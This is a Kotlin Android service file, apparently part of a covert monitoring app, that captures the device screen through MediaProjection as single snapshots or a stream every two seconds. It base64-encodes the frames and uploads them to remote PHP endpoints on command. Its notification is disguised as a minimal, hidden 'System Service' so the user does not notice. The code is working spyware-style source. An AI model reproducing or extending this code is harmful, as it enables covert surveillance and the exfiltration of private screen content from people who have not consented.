package com.smartcrm.monitor

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Live screen streaming service using MediaProjection.
 * Two modes:
 *   1. SNAPSHOT — single screenshot on command
 *   2. STREAM   — continuous frames every 2 seconds
 */
class ScreenStreamService : Service() {

    private val executor      = Executors.newSingleThreadExecutor()
    private val handler       = Handler(Looper.getMainLooper())
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val streaming     = AtomicBoolean(false)
    private var cmdId         = 0
    private var screenWidth   = 720
    private var screenHeight  = 1280
    private var screenDensity = 320

    companion object {
        const val MODE_SNAPSHOT = "snapshot"
        const val MODE_STREAM   = "stream"
        const val STREAM_INTERVAL = 2000L  // 2 seconds per frame
        var isStreaming = false
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotifChannel()
        startForeground(Config.NOTIF_ID + 1, buildNotif())

        val resultCode = intent?.getIntExtra("result_code", Activity.RESULT_CANCELED) ?: return START_NOT_STICKY
        val resultData = intent.getParcelableExtra<Intent>("result_data") ?: return START_NOT_STICKY
        val mode       = intent.getStringExtra("mode") ?: MODE_SNAPSHOT
        cmdId          = intent.getIntExtra("cmd_id", 0)

        // Get screen dimensions
        val wm      = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getMetrics(metrics)
        screenWidth   = metrics.widthPixels
        screenHeight  = metrics.heightPixels
        screenDensity = metrics.densityDpi

        // Start projection
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mpm.getMediaProjection(resultCode, resultData)

        when (mode) {
            MODE_SNAPSHOT -> takeSnapshot()
            MODE_STREAM   -> startStreaming()
        }

        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?) = null

    override fun onDestroy() {
        super.onDestroy()
        stopStreaming()
    }

    // ============================================
    // SINGLE SNAPSHOT
    // ============================================
    private fun takeSnapshot() {
        executor.execute {
            try {
                setupImageReader()
                handler.postDelayed({
                    captureAndSend(cmdId, isStream = false)
                    handler.postDelayed({ stopSelf() }, 3000)
                }, 1000)
            } catch (e: Exception) {
                stopSelf()
            }
        }
    }

    // ============================================
    // CONTINUOUS STREAM
    // ============================================
    private fun startStreaming() {
        streaming.set(true)
        isStreaming = true
        setupImageReader()

        val r = object : Runnable {
            override fun run() {
                if (!streaming.get()) return
                executor.execute { captureAndSend(0, isStream = true) }
                handler.postDelayed(this, STREAM_INTERVAL)
            }
        }
        handler.postDelayed(r, 1000)
    }

    fun stopStreaming() {
        streaming.set(false)
        isStreaming = false
        try { virtualDisplay?.release() } catch (e: Exception) {}
        try { imageReader?.close() } catch (e: Exception) {}
        try { mediaProjection?.stop() } catch (e: Exception) {}
        handler.removeCallbacksAndMessages(null)
    }

    // ============================================
    // IMAGE READER SETUP
    // ============================================
    private fun setupImageReader() {
        imageReader = ImageReader.newInstance(
            screenWidth, screenHeight,
            PixelFormat.RGBA_8888, 2
        )
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "SmartMonitor",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface,
            null, handler
        )
    }

    // ============================================
    // CAPTURE FRAME AND SEND
    // ============================================
    private fun captureAndSend(cmdId: Int, isStream: Boolean) {
        try {
            val image  = imageReader?.acquireLatestImage() ?: return
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride  = planes[0].pixelStride
            val rowStride    = planes[0].rowStride
            val rowPadding   = rowStride - pixelStride * screenWidth

            val bmp = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)
            image.close()

            // Compress to JPEG
            val baos = ByteArrayOutputStream()
            // Lower quality for stream (faster), higher for snapshot
            val quality = if (isStream) 40 else 75
            val scaled  = if (isStream) {
                Bitmap.createScaledBitmap(bmp, screenWidth / 2, screenHeight / 2, false)
            } else bmp
            scaled.compress(Bitmap.CompressFormat.JPEG, quality, baos)
            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)

            val d = JSONObject()
            if (isStream) {
                d.put("type", "screen_frame")
                d.put("frame", b64)
                d.put("width", scaled.width)
                d.put("height", scaled.height)
                ApiClient.post("api.php", d, this)
            } else {
                d.put("command_id", cmdId)
                d.put("image", b64)
                d.put("image_type", "screen")
                ApiClient.postRaw("screenshot_cmd.php", "action=upload", d, this)
            }

            if (!bmp.isRecycled) bmp.recycle()
            if (scaled != bmp && !scaled.isRecycled) scaled.recycle()

        } catch (e: Exception) {}
    }

    // ============================================
    // NOTIFICATION
    // ============================================
    private fun createNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                "stream_ch", "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotif(): Notification {
        return NotificationCompat.Builder(this, "stream_ch")
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }
}
